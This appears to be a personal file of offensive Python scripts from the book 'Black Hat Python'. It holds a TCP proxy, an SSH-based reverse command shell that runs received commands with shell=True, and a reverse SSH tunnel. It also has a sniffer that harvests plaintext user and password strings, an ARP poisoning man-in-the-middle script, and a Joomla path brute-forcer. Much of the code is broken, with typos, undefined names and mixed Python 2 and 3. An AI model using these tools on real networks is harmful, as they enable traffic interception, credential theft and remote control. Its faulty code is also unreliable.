
#Simple Proxy

import sys
import socket
import threading

def server_loop(local_host, local_port, remote_host, remote_port, recieve_first):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        server.bind((local_host, local_port))
    except:
        print(f"Failed to listen on {local_host}:{local_port}")
        sys.exit(0)
    
    print(f"Listening on {local_host}:{local_port}")

    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        print(f"[==>] Recieving incoming connection from {addr[0]}:{addr[1]}")

        proxy_thread = threading.Thread(target=proxy_handler, args=(client_socket, remote_host, remote_port, recieve_first))
        proxy_thread.start()

def main():
    if len(sys.argv[1:]) != 5:
        print(f"Usage: ./proxy.py [localhost][localport][remotehost][remoteport][recievefirst]")
        print("Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True")
        sys.exit(0)

    local_host = sys.argv[1]
    local_port = int(sys.argv[2])

    remote_host = sys.argv[3]
    remote_port = int(sys.argv[4])

    receive_first = sys.argv[5]
    if "True" in receive_first:
        receive_first = True
    else:
        receive_first = False

    server_loop(local_host,local_port,remote_host,remote_port,receive_first)


def proxy_handler(client_socket, remote_host, remote_port, receive_first):
    remote_socket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_socket.connect((remote_host, remote_port))

    if receive_first:
        remote_buffer = receive_from(remote_socket)
        hexdump(remote_buffer)

        remote_buffer = response_handler(remote_buffer)

        if len(remote_buffer):
            print(f"[<==] Sending {len(remote_buffer)}bytes to localhost.")
            client_socket.send(remote_buffer)

    while True:
        local_buffer = receive_from(client_socket)

        if len(local_buffer):
            print(f"[==>] Received {len(local_buffer)}bytes from localhost")
            hexdump(local_buffer)

            local_buffer = request_handler(local_buffer)

            remote_socket.send(local_buffer)
            print("[==> Sent to remote]")

        remote_buffer = receive_from(remote_socket)
        if len(remote_buffer):
            print(f"[<==] Recived {len(remote_buffer)} from remote")
            hexdump(remote_buffer)

            remote_buffer = response_handler(remote_buffer)

            client_socket.send(remote_buffer)
            print("send to localhost")

        if not len(local_buffer) or not len(remote_buffer):
            client_socket.close()
            remote_socket.close()
            print("No more data")

            break

def hexdump(src, length=16):
    result = []
    digits = 4 if isinstance(src, unicode) else 2

    for i in xrange(0, len(src), length):
        s=src[i:i+length]
        hexa = b' '.join(["%0*X" %(digits, ord(x)) for x in s])
        text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.' for x in s])
        result.append(b"%04X  %-*s %s" %(i, length*(digits+1), hexa, text))

    print(b'\n'.join(result))


def receive_from(connection):
    buffer = ""
    # We set a 2 second timeout; depending on your
    # target, this may need to be adjusted
    connection.settimeout(2)
    try:
        # keep reading into the buffer until
        # there's no more data
        # or we time out
        while True:
            data = connection.recv(4096)
            if not data:
                break
            buffer += data
    except:
        pass
    return buffer
# modify any requests destined for the remote host
def request_handler(buffer):
    # perform packet modifications
    return buffer
x # modify any responses destined for the local host
def response_handler(buffer):
# perform packet modifications
    return buffer



# Simple SSH

import sys
import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #`client.load_host_keys('/home/awl/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session= client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print(ssh_session.recv(1024))
    return

def ssh_commandw(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.load_host_keys('/home')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session= client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

###########


hosk_key = paramiko.RSAKey(filename='test_rsa.key')

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if(username == 'awl') and (password== 'lovesthepython'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

try:
    sock = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print("Listening")
    client, addr = sock.accept()
except Exception as e:
    print("Listenig failed: " +str(e))
    sys.exit(1)

print("Got connection")

try:
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(hosk_key)
    server=Server()
    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException as e:
        print("SSH negotiation failed")
    chan=bhSession.accept(20)
    print("Authenticated")
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')
    while True:
        try:
            command = input("Enter command: ").strip('\n')
            if command != 'exit':
                chan.send(command)
                print(chan.recv(1024) + '\n')
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                raise Exception('exit')
        except KeyboardInterrupt:
            bhSession.close()
except Exception as e:
    print('Caught exceprion: ' + str(e))
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)

########
def main():
    options, server, remote = parse_options()
    password = None
    if options.readpass:
        password = getpass.getpass('Enter SSH password')
    client = paramiko.SSHClient()
    client.load_host_keys()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
    verbose('Connecting to ssh host %s:%d ...'%(server[0], server[1]))
    try:
        client.connect(server[0], server[1], username=options.user, key_filename=options.keyfile, look_for_keys=options.look_for_keys ,password=password, )
    except Exception as e:
        print(f"Failed to connect to {server[0], server[1], e}")
        sys.exit(1)

    verbose('Now fowarding remote port ')

    try:
        reverse_foward_tunnel(options.port, remote[0], remote[1], client.get_transport())
    except KeyboardInterrupt:
        print('C-c: Port forwarding stopped')
        sys.exit(0)

def reverse_foward_tunnel(server_port, remote_host, remote_port, transport):
    transport.request_port_forward('', server_port)
    while True:
        chan = transport.accept(1000)
        if chan is None:
            continue
        thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port))
        thr.daemon(True)
        thr.start()

def handler(chan, host, port):
    sock = socket.socket()
    try:
        sock.connect((host, port))
    except Exception as e:
        verbose('Forwarding request')
        return
    
    while True:
        r, w, x = select.select([sock, chan], [],[])
        if sock in r:
            data = sock.recv(1024)
            if len(data) == 0:
                break
            chan.send(data)
        if chan in r:
            data = chan.recv(1024)
            if len(data) == 0:
                break
            sock.send(data)
    chan.close()
    sock.close()


    

# Sniffer

import os, socket

host = '192.168.0.100'

if os.name == "nt":
    socket_protocal = socket.IPPROTO_IP
else:
    socket_protocal = socket.IPPROTO_ICMP

sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocal)
sniffer.bind((host, 0))

# IP headers
sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

if os.name =='nt':
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

print(smiffer.recvfrom(65565))

if os.name=='nt':
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
    

import socket

import os
import struct 
from ctypes import *

host = "192.168.0.187"

class IP(Structure):
    _fields_ = [
        ("ihl",     c_ubyte, 4),
        ("version",     c_ubyte, 4 ),
        ("tos",     c_ubyte),
        ("len",     c_ushort),
        ("id",      c_ushort),
        ("offset",      c_ushort),
        ("ttl",     c_ubyte),
        ("protocal_num",        c_ubyte),
        ("sum",     c_ushort),
        ("src",     c_ulong),
        ("dst",     c_ulong)
    ]

    def __new__(self, socket_buffer=None):
        return self.from_buffer_copy(socket_buffer)

    def __init__(self, socket_buffer=None):
        self.protocal_map = {1:"ICMP", 6:"TCP", 17:"UDP"}

        self.src_address = socket.inet_ntoa(struct.pack("<L", self.src))
        self.dst_address = socket.inet_ntoa(struct.pack("<L", self.dstc))

        try:
            self.protocal = self.protocal_map[self.protocal_num]
        except:
            self.protocal = str(self.protocal_num)

    

# Sniffer
from scapy.all import *

def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" %(packet[IP].dst))
            print("[*]: %s" %(packet[TCP].payload))
    print(packet.show)

sniff(prn=packet_callback,count=1)


# ARP poisoning

import signal

interface ='en1'
target_ip = "172.16.1.71"
gateway_ip ="172.16.1.254"
packet_count = 1000

conf.iface = interface

conf.verb = 0

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("Failed to get mac")
    sys.exit(0)
else:
    print(f"Gateway {gateway_ip, gateway_mac}")

target_mac = get_mac(target_ip)

if target_mac is None:
    print("Failed to get mac")
    sys.exit(0)
else:
    print(f"Gateway {target_ip, target_mac}")

poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("starting sniffer fot packets")

    bpf_filter = "ip host %s" %target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    wrpcap('arper.pcap', packets)

    restore_target(gateway_ip, gateway_mac,target_ip, target_mac)

except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac,target_ip, target_mac)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    responses, unanswerer = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s,r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        
        print("Arp attack finished")
        return




## Web app

import queue
import urllib

target = "http://www.blackhatpython.com"
directory = "/Users/justin/Downloads/joomla-3.1.1"
filters = [".jpg",".gif","png",".css"]

os.chdir(directory)
web_paths = queue.Queue()

for r,d,f in os.walk("."):
    for files in f:
        remote_path = "%s/%s" %(r, files)
        if remote_path.startswith("."):
            remote_path = remote_path[1:]
        if os.path.splitext(files)[1] not in filters:
            web_paths.put(remote_path)

def test_remote():
    while not web_paths.empty():
        path = web_paths.get()
        url = "%s %s"%(target, path)

        request = urllib.request(url)
        try:
            response = urllib.urlopen(request)
            content = response.read()

            print(f"{response.code},{ path}")
            response.close()
        except urllib.HTTPError as error:
            print("Failed %s" %error.code)
            pass

for i in range(threads):
    t=threading.Thread(target= test_remote)
    t.start()
    




